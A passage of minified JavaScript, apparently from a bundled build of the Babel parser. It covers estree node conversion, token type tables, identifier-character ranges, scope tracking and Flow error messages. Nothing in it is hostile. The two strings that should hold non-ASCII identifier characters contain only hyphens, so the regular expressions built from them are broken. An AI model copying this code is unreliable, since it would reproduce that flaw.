J=J,delete J.id,J.name=Y,this.castNodeTo(J,"PrivateIdentifier")}isPrivateName(J){if(!this.getPluginOption("estree","classFeatures"))return super.isPrivateName(J);return J.type==="PrivateIdentifier"}getPrivateNameSV(J){if(!this.getPluginOption("estree","classFeatures"))return super.getPrivateNameSV(J);return J.name}parseLiteral(J,Y){let W=super.parseLiteral(J,Y);return W.raw=W.extra.raw,delete W.extra,W}parseFunctionBody(J,Y,W=!1){super.parseFunctionBody(J,Y,W),J.expression=J.body.type!=="BlockStatement"}parseMethod(J,Y,W,G,H,$,z=!1){let U=this.startNode();U.kind=J.kind,U=super.parseMethod(U,Y,W,G,H,$,z),delete U.kind;let{typeParameters:K}=J;if(K)delete J.typeParameters,U.typeParameters=K,this.resetStartLocationFromNode(U,K);let B=this.castNodeTo(U,"FunctionExpression");if(J.value=B,$==="ClassPrivateMethod")J.computed=!1;if($==="ObjectMethod"){if(J.kind==="method")J.kind="init";return J.shorthand=!1,this.finishNode(J,"Property")}else return this.finishNode(J,"MethodDefinition")}nameIsConstructor(J){if(J.type==="Literal")return J.value==="constructor";return super.nameIsConstructor(J)}parseClassProperty(...J){let Y=super.parseClassProperty(...J);if(!this.getPluginOption("estree","classFeatures"))return Y;return this.castNodeTo(Y,"PropertyDefinition"),Y}parseClassPrivateProperty(...J){let Y=super.parseClassPrivateProperty(...J);if(!this.getPluginOption("estree","classFeatures"))return Y;return this.castNodeTo(Y,"PropertyDefinition"),Y.computed=!1,Y}parseClassAccessorProperty(J){let Y=super.parseClassAccessorProperty(J);if(!this.getPluginOption("estree","classFeatures"))return Y;if(Y.abstract&&this.hasPlugin("typescript"))delete Y.abstract,this.castNodeTo(Y,"TSAbstractAccessorProperty");else this.castNodeTo(Y,"AccessorProperty");return Y}parseObjectProperty(J,Y,W,G){let H=super.parseObjectProperty(J,Y,W,G);if(H)H.kind="init",this.castNodeTo(H,"Property");return H}finishObjectProperty(J){return J.kind="init",this.finishNode(J,"Property")}isValidLVal(J,Y,W){return J==="Property"?"value":super.isValidLVal(J,Y,W)}isAssignable(J,Y){if(J!=null&&this.isObjectProperty(J))return this.isAssignable(J.value,Y);return super.isAssignable(J,Y)}toAssignable(J,Y=!1){if(J!=null&&this.isObjectProperty(J)){let{key:W,value:G}=J;if(this.isPrivateName(W))this.classScope.usePrivateName(this.getPrivateNameSV(W),W.loc.start);this.toAssignable(G,Y)}else super.toAssignable(J,Y)}toAssignableObjectExpressionProp(J,Y,W){if(J.type==="Property"&&(J.kind==="get"||J.kind==="set"))this.raise(x.PatternHasAccessor,J.key);else if(J.type==="Property"&&J.method)this.raise(x.PatternHasMethod,J.key);else super.toAssignableObjectExpressionProp(J,Y,W)}finishCallExpression(J,Y){let W=super.finishCallExpression(J,Y);if(W.callee.type==="Import"){var G;this.castNodeTo(W,"ImportExpression"),W.source=W.arguments[0],W.options=(G=W.arguments[1])!=null?G:null;{var H;W.attributes=(H=W.arguments[1])!=null?H:null}delete W.arguments,delete W.callee}else if(W.type==="OptionalCallExpression")this.castNodeTo(W,"CallExpression");else W.optional=!1;return W}toReferencedArguments(J){if(J.type==="ImportExpression")return;super.toReferencedArguments(J)}parseExport(J,Y){let W=this.state.lastTokStartLoc,G=super.parseExport(J,Y);switch(G.type){case"ExportAllDeclaration":G.exported=null;break;case"ExportNamedDeclaration":if(G.specifiers.length===1&&G.specifiers[0].type==="ExportNamespaceSpecifier")this.castNodeTo(G,"ExportAllDeclaration"),G.exported=G.specifiers[0].exported,delete G.specifiers;case"ExportDefaultDeclaration":{var H;let{declaration:$}=G;if(($==null?void 0:$.type)==="ClassDeclaration"&&((H=$.decorators)==null?void 0:H.length)>0&&$.start===G.start)this.resetStartLocation(G,W)}break}return G}stopParseSubscript(J,Y){let W=super.stopParseSubscript(J,Y);if(Y.optionalChainMember)return this.estreeParseChainExpression(W,J.loc.end);return W}parseMember(J,Y,W,G,H){let $=super.parseMember(J,Y,W,G,H);if($.type==="OptionalMemberExpression")this.castNodeTo($,"MemberExpression");else $.optional=!1;return $}isOptionalMemberExpression(J){if(J.type==="ChainExpression")return J.expression.type==="MemberExpression";return super.isOptionalMemberExpression(J)}hasPropertyAsPrivateName(J){if(J.type==="ChainExpression")J=J.expression;return super.hasPropertyAsPrivateName(J)}isObjectProperty(J){return J.type==="Property"&&J.kind==="init"&&!J.method}isObjectMethod(J){return J.type==="Property"&&(J.method||J.kind==="get"||J.kind==="set")}castNodeTo(J,Y){let W=super.castNodeTo(J,Y);return this.fillOptionalPropertiesForTSESLint(W),W}cloneIdentifier(J){let Y=super.cloneIdentifier(J);return this.fillOptionalPropertiesForTSESLint(Y),Y}cloneStringLiteral(J){if(J.type==="Literal")return this.cloneEstreeStringLiteral(J);return super.cloneStringLiteral(J)}finishNodeAt(J,Y,W){return N4(super.finishNodeAt(J,Y,W))}finishNode(J,Y){let W=super.finishNode(J,Y);return this.fillOptionalPropertiesForTSESLint(W),W}resetStartLocation(J,Y){super.resetStartLocation(J,Y),N4(J)}resetEndLocation(J,Y=this.state.lastTokEndLoc){super.resetEndLocation(J,Y),N4(J)}};class t7{constructor(X,Q){this.token=void 0,this.preserveSpace=void 0,this.token=X,this.preserveSpace=!!Q}}var L0={brace:new t7("{"),j_oTag:new t7("<tag"),j_cTag:new t7("</tag"),j_expr:new t7("<tag>...</tag>",!0)};L0.template=new t7("`",!0);var z0=!0,L1=!0,MH=!0,w4=!0,zX=!0,Jv=!0;class NH{constructor(X,Q={}){this.label=void 0,this.keyword=void 0,this.beforeExpr=void 0,this.startsExpr=void 0,this.rightAssociative=void 0,this.isLoop=void 0,this.isAssign=void 0,this.prefix=void 0,this.postfix=void 0,this.binop=void 0,this.label=X,this.keyword=Q.keyword,this.beforeExpr=!!Q.beforeExpr,this.startsExpr=!!Q.startsExpr,this.rightAssociative=!!Q.rightAssociative,this.isLoop=!!Q.isLoop,this.isAssign=!!Q.isAssign,this.prefix=!!Q.prefix,this.postfix=!!Q.postfix,this.binop=Q.binop!=null?Q.binop:null,this.updateContext=null}}var wH=new Map;function j0(X,Q={}){Q.keyword=X;let J=h1(X,Q);return wH.set(X,J),J}function I9(X,Q){return h1(X,{beforeExpr:z0,binop:Q})}var S4=-1,w8=[],IH=[],CH=[],PH=[],SH=[],EH=[];function h1(X,Q={}){var J,Y,W,G;return++S4,IH.push(X),CH.push((J=Q.binop)!=null?J:-1),PH.push((Y=Q.beforeExpr)!=null?Y:!1),SH.push((W=Q.startsExpr)!=null?W:!1),EH.push((G=Q.prefix)!=null?G:!1),w8.push(new NH(X,Q)),S4}function K0(X,Q={}){var J,Y,W,G;return++S4,wH.set(X,S4),IH.push(X),CH.push((J=Q.binop)!=null?J:-1),PH.push((Y=Q.beforeExpr)!=null?Y:!1),SH.push((W=Q.startsExpr)!=null?W:!1),EH.push((G=Q.prefix)!=null?G:!1),w8.push(new NH("name",Q)),S4}var Yv={bracketL:h1("[",{beforeExpr:z0,startsExpr:L1}),bracketHashL:h1("#[",{beforeExpr:z0,startsExpr:L1}),bracketBarL:h1("[|",{beforeExpr:z0,startsExpr:L1}),bracketR:h1("]"),bracketBarR:h1("|]"),braceL:h1("{",{beforeExpr:z0,startsExpr:L1}),braceBarL:h1("{|",{beforeExpr:z0,startsExpr:L1}),braceHashL:h1("#{",{beforeExpr:z0,startsExpr:L1}),braceR:h1("}"),braceBarR:h1("|}"),parenL:h1("(",{beforeExpr:z0,startsExpr:L1}),parenR:h1(")"),comma:h1(",",{beforeExpr:z0}),semi:h1(";",{beforeExpr:z0}),colon:h1(":",{beforeExpr:z0}),doubleColon:h1("::",{beforeExpr:z0}),dot:h1("."),question:h1("?",{beforeExpr:z0}),questionDot:h1("?."),arrow:h1("=>",{beforeExpr:z0}),template:h1("template"),ellipsis:h1("...",{beforeExpr:z0}),backQuote:h1("`",{startsExpr:L1}),dollarBraceL:h1("${",{beforeExpr:z0,startsExpr:L1}),templateTail:h1("...`",{startsExpr:L1}),templateNonTail:h1("...${",{beforeExpr:z0,startsExpr:L1}),at:h1("@"),hash:h1("#",{startsExpr:L1}),interpreterDirective:h1("#!..."),eq:h1("=",{beforeExpr:z0,isAssign:w4}),assign:h1("_=",{beforeExpr:z0,isAssign:w4}),slashAssign:h1("_=",{beforeExpr:z0,isAssign:w4}),xorAssign:h1("_=",{beforeExpr:z0,isAssign:w4}),moduloAssign:h1("_=",{beforeExpr:z0,isAssign:w4}),incDec:h1("++/--",{prefix:zX,postfix:Jv,startsExpr:L1}),bang:h1("!",{beforeExpr:z0,prefix:zX,startsExpr:L1}),tilde:h1("~",{beforeExpr:z0,prefix:zX,startsExpr:L1}),doubleCaret:h1("^^",{startsExpr:L1}),doubleAt:h1("@@",{startsExpr:L1}),pipeline:I9("|>",0),nullishCoalescing:I9("??",1),logicalOR:I9("||",1),logicalAND:I9("&&",2),bitwiseOR:I9("|",3),bitwiseXOR:I9("^",4),bitwiseAND:I9("&",5),equality:I9("==/!=/===/!==",6),lt:I9("</>/<=/>=",7),gt:I9("</>/<=/>=",7),relational:I9("</>/<=/>=",7),bitShift:I9("<</>>/>>>",8),bitShiftL:I9("<</>>/>>>",8),bitShiftR:I9("<</>>/>>>",8),plusMin:h1("+/-",{beforeExpr:z0,binop:9,prefix:zX,startsExpr:L1}),modulo:h1("%",{binop:10,startsExpr:L1}),star:h1("*",{binop:10}),slash:I9("/",10),exponent:h1("**",{beforeExpr:z0,binop:11,rightAssociative:!0}),_in:j0("in",{beforeExpr:z0,binop:7}),_instanceof:j0("instanceof",{beforeExpr:z0,binop:7}),_break:j0("break"),_case:j0("case",{beforeExpr:z0}),_catch:j0("catch"),_continue:j0("continue"),_debugger:j0("debugger"),_default:j0("default",{beforeExpr:z0}),_else:j0("else",{beforeExpr:z0}),_finally:j0("finally"),_function:j0("function",{startsExpr:L1}),_if:j0("if"),_return:j0("return",{beforeExpr:z0}),_switch:j0("switch"),_throw:j0("throw",{beforeExpr:z0,prefix:zX,startsExpr:L1}),_try:j0("try"),_var:j0("var"),_const:j0("const"),_with:j0("with"),_new:j0("new",{beforeExpr:z0,startsExpr:L1}),_this:j0("this",{startsExpr:L1}),_super:j0("super",{startsExpr:L1}),_class:j0("class",{startsExpr:L1}),_extends:j0("extends",{beforeExpr:z0}),_export:j0("export"),_import:j0("import",{startsExpr:L1}),_null:j0("null",{startsExpr:L1}),_true:j0("true",{startsExpr:L1}),_false:j0("false",{startsExpr:L1}),_typeof:j0("typeof",{beforeExpr:z0,prefix:zX,startsExpr:L1}),_void:j0("void",{beforeExpr:z0,prefix:zX,startsExpr:L1}),_delete:j0("delete",{beforeExpr:z0,prefix:zX,startsExpr:L1}),_do:j0("do",{isLoop:MH,beforeExpr:z0}),_for:j0("for",{isLoop:MH}),_while:j0("while",{isLoop:MH}),_as:K0("as",{startsExpr:L1}),_assert:K0("assert",{startsExpr:L1}),_async:K0("async",{startsExpr:L1}),_await:K0("await",{startsExpr:L1}),_defer:K0("defer",{startsExpr:L1}),_from:K0("from",{startsExpr:L1}),_get:K0("get",{startsExpr:L1}),_let:K0("let",{startsExpr:L1}),_meta:K0("meta",{startsExpr:L1}),_of:K0("of",{startsExpr:L1}),_sent:K0("sent",{startsExpr:L1}),_set:K0("set",{startsExpr:L1}),_source:K0("source",{startsExpr:L1}),_static:K0("static",{startsExpr:L1}),_using:K0("using",{startsExpr:L1}),_yield:K0("yield",{startsExpr:L1}),_asserts:K0("asserts",{startsExpr:L1}),_checks:K0("checks",{startsExpr:L1}),_exports:K0("exports",{startsExpr:L1}),_global:K0("global",{startsExpr:L1}),_implements:K0("implements",{startsExpr:L1}),_intrinsic:K0("intrinsic",{startsExpr:L1}),_infer:K0("infer",{startsExpr:L1}),_is:K0("is",{startsExpr:L1}),_mixins:K0("mixins",{startsExpr:L1}),_proto:K0("proto",{startsExpr:L1}),_require:K0("require",{startsExpr:L1}),_satisfies:K0("satisfies",{startsExpr:L1}),_keyof:K0("keyof",{startsExpr:L1}),_readonly:K0("readonly",{startsExpr:L1}),_unique:K0("unique",{startsExpr:L1}),_abstract:K0("abstract",{startsExpr:L1}),_declare:K0("declare",{startsExpr:L1}),_enum:K0("enum",{startsExpr:L1}),_module:K0("module",{startsExpr:L1}),_namespace:K0("namespace",{startsExpr:L1}),_interface:K0("interface",{startsExpr:L1}),_type:K0("type",{startsExpr:L1}),_opaque:K0("opaque",{startsExpr:L1}),name:h1("name",{startsExpr:L1}),placeholder:h1("%%",{startsExpr:L1}),string:h1("string",{startsExpr:L1}),num:h1("num",{startsExpr:L1}),bigint:h1("bigint",{startsExpr:L1}),decimal:h1("decimal",{startsExpr:L1}),regexp:h1("regexp",{startsExpr:L1}),privateName:h1("#name",{startsExpr:L1}),eof:h1("eof"),jsxName:h1("jsxName"),jsxText:h1("jsxText",{beforeExpr:z0}),jsxTagStart:h1("jsxTagStart",{startsExpr:L1}),jsxTagEnd:h1("jsxTagEnd")};function w0(X){return X>=93&&X<=133}function Wv(X){return X<=92}function C6(X){return X>=58&&X<=133}function Nq(X){return X>=58&&X<=137}function Gv(X){return PH[X]}function C4(X){return SH[X]}function Hv(X){return X>=29&&X<=33}function Bq(X){return X>=129&&X<=131}function $v(X){return X>=90&&X<=92}function TH(X){return X>=58&&X<=92}function zv(X){return X>=39&&X<=59}function Uv(X){return X===34}function Kv(X){return EH[X]}function Vv(X){return X>=121&&X<=123}function Bv(X){return X>=124&&X<=130}function VX(X){return IH[X]}function rJ(X){return CH[X]}function qv(X){return X===57}function aJ(X){return X>=24&&X<=25}function D8(X){return w8[X]}w8[8].updateContext=(X)=>{X.pop()},w8[5].updateContext=w8[7].updateContext=w8[23].updateContext=(X)=>{X.push(L0.brace)},w8[22].updateContext=(X)=>{if(X[X.length-1]===L0.template)X.pop();else X.push(L0.template)},w8[143].updateContext=(X)=>{X.push(L0.j_expr,L0.j_oTag)};var _H="------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------",wq="-----------------------------------------------------------------------------------------------------------------------------------------------------",Zv=new RegExp("["+_H+"]"),Mv=new RegExp("["+_H+wq+"]");_H=wq=null;var Iq=[0,11,2,25,2,18,2,1,2,14,3,13,35,122,70,52,268,28,4,48,48,31,14,29,6,37,11,29,3,35,5,7,2,4,43,157,19,35,5,35,5,39,9,51,13,10,2,14,2,6,2,1,2,10,2,14,2,6,2,1,4,51,13,310,10,21,11,7,25,5,2,41,2,8,70,5,3,0,2,43,2,1,4,0,3,22,11,22,10,30,66,18,2,1,11,21,11,25,71,55,7,1,65,0,16,3,2,2,2,28,43,28,4,28,36,7,2,27,28,53,11,21,11,18,14,17,111,72,56,50,14,50,14,35,39,27,10,22,251,41,7,1,17,2,60,28,11,0,9,21,43,17,47,20,28,22,13,52,58,1,3,0,14,44,33,24,27,35,30,0,3,0,9,34,4,0,13,47,15,3,22,0,2,0,36,17,2,24,20,1,64,6,2,0,2,3,2,14,2,9,8,46,39,7,3,1,3,21,2,6,2,1,2,4,4,0,19,0,13,4,31,9,2,0,3,0,2,37,2,0,26,0,2,0,45,52,19,3,21,2,31,47,21,1,2,0,185,46,42,3,37,47,21,0,60,42,14,0,72,26,38,6,186,43,117,63,32,7,3,0,3,7,2,1,2,23,16,0,2,0,95,7,3,38,17,0,2,0,29,0,11,39,8,0,22,0,12,45,20,0,19,72,200,32,32,8,2,36,18,0,50,29,113,6,2,1,2,37,22,0,26,5,2,1,2,31,15,0,328,18,16,0,2,12,2,33,125,0,80,921,103,110,18,195,2637,96,16,1071,18,5,26,3994,6,582,6842,29,1763,568,8,30,18,78,18,29,19,47,17,3,32,20,6,18,433,44,212,63,129,74,6,0,67,12,65,1,2,0,29,6135,9,1237,42,9,8936,3,2,6,2,1,2,290,16,0,30,2,3,0,15,3,9,395,2309,106,6,12,4,8,8,9,5991,84,2,70,2,1,3,0,3,1,3,3,2,11,2,0,2,6,2,64,2,3,3,7,2,6,2,27,2,3,2,4,2,0,4,6,2,339,3,24,2,24,2,30,2,24,2,30,2,24,2,30,2,24,2,30,2,24,2,7,1845,30,7,5,262,61,147,44,11,6,17,0,322,29,19,43,485,27,229,29,3,0,496,6,2,3,2,1,2,14,2,196,60,67,8,0,1205,3,2,26,2,1,2,0,3,0,2,9,2,3,2,0,2,0,7,0,5,0,2,0,2,0,2,2,2,1,2,0,3,0,2,0,2,0,2,0,2,0,2,1,2,0,3,3,2,6,2,3,2,3,2,0,2,9,2,16,6,2,2,4,2,16,4421,42719,33,4153,7,221,3,5761,15,7472,16,621,2467,541,1507,4938,6,4191],jv=[509,0,227,0,150,4,294,9,1368,2,2,1,6,3,41,2,5,0,166,1,574,3,9,9,7,9,32,4,318,1,80,3,71,10,50,3,123,2,54,14,32,10,3,1,11,3,46,10,8,0,46,9,7,2,37,13,2,9,6,1,45,0,13,2,49,13,9,3,2,11,83,11,7,0,3,0,158,11,6,9,7,3,56,1,2,6,3,1,3,2,10,0,11,1,3,6,4,4,68,8,2,0,3,0,2,3,2,4,2,0,15,1,83,17,10,9,5,0,82,19,13,9,214,6,3,8,28,1,83,16,16,9,82,12,9,9,7,19,58,14,5,9,243,14,166,9,71,5,2,1,3,3,2,0,2,1,13,9,120,6,3,6,4,0,29,9,41,6,2,3,9,0,10,10,47,15,343,9,54,7,2,7,17,9,57,21,2,13,123,5,4,0,2,1,2,6,2,0,9,9,49,4,2,1,2,4,9,9,330,3,10,1,2,0,49,6,4,4,14,10,5350,0,7,14,11465,27,2343,9,87,9,39,4,60,6,26,9,535,9,470,0,2,54,8,3,82,0,12,1,19628,1,4178,9,519,45,3,22,543,4,4,5,9,7,3,6,31,3,149,2,1418,49,513,54,5,49,9,0,15,0,23,4,2,14,1361,6,2,16,3,6,2,1,2,4,101,0,161,6,10,9,357,0,62,13,499,13,245,1,2,9,726,6,110,6,6,9,4759,9,787719,239];function RH(X,Q){let J=65536;for(let Y=0,W=Q.length;Y<W;Y+=2){if(J+=Q[Y],J>X)return!1;if(J+=Q[Y+1],J>=X)return!0}return!1}function I8(X){if(X<65)return X===36;if(X<=90)return!0;if(X<97)return X===95;if(X<=122)return!0;if(X<=65535)return X>=170&&Zv.test(String.fromCharCode(X));return RH(X,Iq)}function X5(X){if(X<48)return X===36;if(X<58)return!0;if(X<65)return!1;if(X<=90)return!0;if(X<97)return X===95;if(X<=122)return!0;if(X<=65535)return X>=170&&Mv.test(String.fromCharCode(X));return RH(X,Iq)||RH(X,jv)}var kH={keyword:["break","case","catch","continue","debugger","default","do","else","finally","for","function","if","return","switch","throw","try","var","const","while","with","new","this","super","class","extends","export","import","null","true","false","in","instanceof","typeof","void","delete"],strict:["implements","interface","let","package","private","protected","public","static","yield"],strictBind:["eval","arguments"]},Fv=new Set(kH.keyword),Ov=new Set(kH.strict),Av=new Set(kH.strictBind);function Cq(X,Q){return Q&&X==="await"||X==="enum"}function Pq(X,Q){return Cq(X,Q)||Ov.has(X)}function Sq(X){return Av.has(X)}function Eq(X,Q){return Pq(X,Q)||Sq(X)}function Rv(X){return Fv.has(X)}function Lv(X,Q,J){return X===64&&Q===64&&I8(J)}var Dv=new Set(["break","case","catch","continue","debugger","default","do","else","finally","for","function","if","return","switch","throw","try","var","const","while","with","new","this","super","class","extends","export","import","null","true","false","in","instanceof","typeof","void","delete","implements","interface","let","package","private","protected","public","static","yield","eval","arguments","enum","await"]);function Nv(X){return Dv.has(X)}class oJ{constructor(X){this.flags=0,this.names=new Map,this.firstLexicalName="",this.flags=X}}class sJ{constructor(X,Q){this.parser=void 0,this.scopeStack=[],this.inModule=void 0,this.undefinedExports=new Map,this.parser=X,this.inModule=Q}get inTopLevel(){return(this.currentScope().flags&1)>0}get inFunction(){return(this.currentVarScopeFlags()&2)>0}get allowSuper(){return(this.currentThisScopeFlags()&16)>0}get allowDirectSuper(){return(this.currentThisScopeFlags()&32)>0}get allowNewTarget(){return(this.currentThisScopeFlags()&512)>0}get inClass(){return(this.currentThisScopeFlags()&64)>0}get inClassAndNotInNonArrowFunction(){let X=this.currentThisScopeFlags();return(X&64)>0&&(X&2)===0}get inStaticBlock(){for(let X=this.scopeStack.length-1;;X--){let{flags:Q}=this.scopeStack[X];if(Q&128)return!0;if(Q&1731)return!1}}get inNonArrowFunction(){return(this.currentThisScopeFlags()&2)>0}get inBareCaseStatement(){return(this.currentScope().flags&256)>0}get treatFunctionsAsVar(){return this.treatFunctionsAsVarInScope(this.currentScope())}createScope(X){return new oJ(X)}enter(X){this.scopeStack.push(this.createScope(X))}exit(){return this.scopeStack.pop().flags}treatFunctionsAsVarInScope(X){return!!(X.flags&130||!this.parser.inModule&&X.flags&1)}declareName(X,Q,J){let Y=this.currentScope();if(Q&8||Q&16){this.checkRedeclarationInScope(Y,X,Q,J);let W=Y.names.get(X)||0;if(Q&16)W=W|4;else{if(!Y.firstLexicalName)Y.firstLexicalName=X;W=W|2}if(Y.names.set(X,W),Q&8)this.maybeExportDefined(Y,X)}else if(Q&4){for(let W=this.scopeStack.length-1;W>=0;--W)if(Y=this.scopeStack[W],this.checkRedeclarationInScope(Y,X,Q,J),Y.names.set(X,(Y.names.get(X)||0)|1),this.maybeExportDefined(Y,X),Y.flags&1667)break}if(this.parser.inModule&&Y.flags&1)this.undefinedExports.delete(X)}maybeExportDefined(X,Q){if(this.parser.inModule&&X.flags&1)this.undefinedExports.delete(Q)}checkRedeclarationInScope(X,Q,J,Y){if(this.isRedeclaredInScope(X,Q,J))this.parser.raise(x.VarRedeclaration,Y,{identifierName:Q})}isRedeclaredInScope(X,Q,J){if(!(J&1))return!1;if(J&8)return X.names.has(Q);let Y=X.names.get(Q);if(J&16)return(Y&2)>0||!this.treatFunctionsAsVarInScope(X)&&(Y&1)>0;return(Y&2)>0&&!(X.flags&8&&X.firstLexicalName===Q)||!this.treatFunctionsAsVarInScope(X)&&(Y&4)>0}checkLocalExport(X){let{name:Q}=X;if(!this.scopeStack[0].names.has(Q))this.undefinedExports.set(Q,X.loc.start)}currentScope(){return this.scopeStack[this.scopeStack.length-1]}currentVarScopeFlags(){for(let X=this.scopeStack.length-1;;X--){let{flags:Q}=this.scopeStack[X];if(Q&1667)return Q}}currentThisScopeFlags(){for(let X=this.scopeStack.length-1;;X--){let{flags:Q}=this.scopeStack[X];if(Q&1731&&!(Q&4))return Q}}}class Tq extends oJ{constructor(...X){super(...X);this.declareFunctions=new Set}}class _q extends sJ{createScope(X){return new Tq(X)}declareName(X,Q,J){let Y=this.currentScope();if(Q&2048){this.checkRedeclarationInScope(Y,X,Q,J),this.maybeExportDefined(Y,X),Y.declareFunctions.add(X);return}super.declareName(X,Q,J)}isRedeclaredInScope(X,Q,J){if(super.isRedeclaredInScope(X,Q,J))return!0;if(J&2048&&!X.declareFunctions.has(Q)){let Y=X.names.get(Q);return(Y&4)>0||(Y&2)>0}return!1}checkLocalExport(X){if(!this.scopeStack[0].declareFunctions.has(X.name))super.checkLocalExport(X)}}var wv=new Set(["_","any","bool","boolean","empty","extends","false","interface","mixed","null","number","static","string","true","typeof","void"]),l1=n6`flow`({AmbiguousConditionalArrow:"Ambiguous expression: wrap the arrow functions in parentheses to disambiguate.",AmbiguousDeclareModuleKind:"Found both `declare module.exports` and `declare export` in the same module. Modules can only have 1 since they are either an ES module or they are a CommonJS module.",AssignReservedType:({reservedType:X})=>`Cannot overwrite reserved type ${X}.`,DeclareClassElement:"The `declare` modifier can only appear on class fields.",DeclareClassFieldInitializer:"Initializers are not allowed in fields with the `declare` modifier.",DuplicateDeclareModuleExports:"Duplicate `declare module.exports` statement.",EnumBooleanMemberNotInitialized:({memberName:X,enumName:Q})=>`Boolean enum members need to be initialized. Use either \`${X} = true,\` or \`${X} = false,\` in enum \`${Q}\`.`,EnumDuplicateMemberName:({memberName:X,enumName:Q})=>`Enum member names need to be unique, but the name \`${X}\` has already been used before in enum \`${Q}\`.`,EnumInconsistentMemberValues:({enumName:X})=>`Enum \`${X}\` has inconsistent member initializers. Either use no initializers, or consistently use literals (either booleans, numbers, or strings) for all member initializers.`,EnumInvalidExplicitType:({invalidEnumType:X,enumName:Q})=>`Enum type \`${X}\` is not valid. Use one of \`boolean\`, \`number\`, \`string\`, or \`symbol\` in enum \`${Q}\`.`,EnumInvalidExplicitTypeUnknownSupplied:({enumName:X})=>`Supplied enum type is not valid. Use one of \`boolean\`, \`number\`, \`string\`, or \`symbol\` in enum \`${X}\`.`,EnumInvalidMemberInitializerPrimaryType:({enumName:X,memberName:Q,explicitType:J})=>`Enum \`${X}\` has type \`${J}\`, so the initializer of \`${Q}\` needs to be a ${J} literal.`,EnumInvalidMemberInitializerSymbolType:({enumName:X,memberName:Q})=>`Symbol enum members cannot be initialized. Use \`${Q},\` in enum \`${X}\`.`,EnumInvalidMemberInitializerUnknownType:({enumName:X,memberName:Q})=>`The enum member initializer for \`${Q}\` needs to be a literal (either a boolean, number, or string) in enum \`${X}\`.`,EnumInvalidMemberName:({enumName:X,memberName:Q,suggestion:J})=>`Enum member names cannot start with lowercase 'a' through 'z'. Instead of using \`${Q}\`, consider using \`${J}\`, in enum \`${X}\`.`,EnumNumberMemberNotInitialized:({enumName:X,memberName:Q})=>`Number enum members need to be initialized, e.g. \`${Q} = 1\` in enum \`${X}\`.`,EnumStringMemberInconsistentlyInitialized:({enumName:X})=>`String enum members need to consistently either all use initializers, or use no initializers, in enum \`${X}\`.`,GetterMayNotHaveThisParam:"A getter cannot have a `this` parameter.",ImportReflectionHasImportType:"An `import module` declaration can not use `type` or `typeof` keyword.",ImportTypeShorthandOnlyInPureImport:"The `type` and `typeof` keywords on named imports can only be used on regular `import` statements. It cannot be used with `import type` or `import typeof` statements.",InexactInsideExact:"Explicit inexact syntax cannot appear inside an explicit exact object type.",InexactInsideNonObject:"Explicit inexact syntax cannot appear in class or interface definitions.",InexactVariance:"Explicit inexact syntax cannot have variance.",InvalidNonTypeImportInDeclareModule:"Imports within a `declare module` body must always be `import type` or `import typeof`.",MissingTypeParamDefault:"Type parameter declaration needs a default, since a preceding type parameter declaration has a default.",NestedDeclareModule:"`declare module` cannot be used inside another `declare module`.",NestedFlowComment:"Cannot have a flow comment inside another flow comment.",PatternIsOptional:Object.assign({message:"A binding pattern parameter cannot be optional in an implementation signature."},{reasonCode:"OptionalBindingPattern"}),SetterMayNotHaveThisParam:"A setter cannot have a `this` parameter.",SpreadVariance:"Spread properties cannot have variance.",ThisParamAnnotationRequired:"A type annotation is required for the `this` parameter.",ThisParamBannedInConstructor:"Constructors cannot have a `this` parameter; constructors don't bind `this` like other functions.",ThisParamMayNotBeOptional:"The `this` parameter cannot be optional.",ThisParamMustBeFirst:"The `this` parameter must be the first function parameter.",ThisParamNoDefault:"The `this` parameter may not have a default value.",TypeBeforeInitializer:"Type annotations must come before default assignments, e.g. instead of `age = 25: number` use `age: number = 25`.",TypeCastInPattern:"The type cast expression is expected to be wrapped with parenthesis.",UnexpectedExplicitInexactInObject:"Explicit inexact syntax must appear at the end of an inexact object.",UnexpectedReservedType:({reservedType:X})=>`Unexpected reserved type ${X}.`,UnexpectedReservedUnderscore:"`_` is only allowed as a type argument to call or new.",UnexpectedSpaceBetweenModuloChecks:"Spaces between `%` and `checks` are not allowed here.",UnexpectedSpreadType:"Spread operator cannot appear in class or interface definitions.",UnexpectedSubtractionOperand:'Unexpected token, expected "number" or "bigint".',UnexpectedTokenAfterTypeParameter:"Expected an arrow function after this type parameter declaration.",UnexpectedTypeParameterBeforeAsyncArrowFunction:"Type parameters must come after the async keyword, e.g. instead of `<T> async () => {}`, use `async <T>() => {}`.",UnsupportedDeclareExportKind:({unsupportedExportKind:X,suggestion:Q})=>`\`declare export ${X}\` is not supported. Use \`${Q}\` instead.`,UnsupportedStatementInDeclareModule:"Only declares and type imports are allowed inside declare module.",UnterminatedFlowComment:"Unterminated flow-comment."});function Iv(X){return X.type==="DeclareExportAllDeclaration"||X.type==="DeclareExportDeclaration"&&(!X.declaration||X.declaration.type!=="TypeAlias"&&X.declaration.type!=="InterfaceDeclaration")}function qq(X){return X.importKind==="type"||X.importKind==="typeof"}var Cv={const:"declare export var",let:"declare export var",type:"export type",interface:"export interface"};function Pv(X,Q){let J=[],Y=[];for(let W=0;W<X.length;W++)(Q(X[W],W,X)?J:Y).push(X[W]);return[J,Y]}var Sv=/\*?\s*@((?:no)?flow)\b/,Ev=(X)=>class extends X{constructor(...J){super(...J);this.flowPragma=void 0}getScopeHandler(){return _q}shouldParseTypes(){return this.getPluginOption("flow","all")||this.flowPragma==="flow"}finishToken(J,Y){if(J!==134&&J!==13&&J!==28){if(this.flowPragma===void 0)this.flowPragma=null}super.finishToken(J,Y)}addComment(J){if(this.flowPragma===void 0){let Y=Sv.exec(J.value);if(!Y);else if(Y[1]==="flow")this.flowPragma="flow";else if(Y[1]==="noflow")this.flowPragma="noflow";else throw Error("Unexpected flow pragma")}super.addComment(J)}flowParseTypeInitialiser(J){let Y=this.state.inType;this.state.inType=!0,this.expect(J||14);let W=this.flowParseType();return this.state.inType=Y,W}flowParsePredicate(){let J=this.startNode(),Y=this.state.startLoc;if(this.next(),this.expectContextual(110),this.state.lastTokStartLoc.index>Y.index+1)this.raise(l1.UnexpectedSpaceBetweenModuloChecks,Y);if(this.eat(10))return J.value=super.parseExpression(),this.expect(11),this.finishNode(J,"DeclaredPredicate");else return this.finishNode(J,"InferredPredicate")}flowParseTypeAndPredicateInitialiser(){let J=this.state.inType;this.state.inType=!0,this.expect(14);let Y=null,W=null;if(this.match(54))this.state.inType=J,W=this.flowParsePredicate();else if(Y=this.flowParseType(),this.state.inType=J,this.match(54))W=this.flowParsePredicate();return[Y,W]}flowParseDeclareClass(J){return this.next(),this.flowParseInterfaceish(J,!0),this.finishNode(J,"DeclareClass")}flowParseDeclareFunction(J){this.next();let 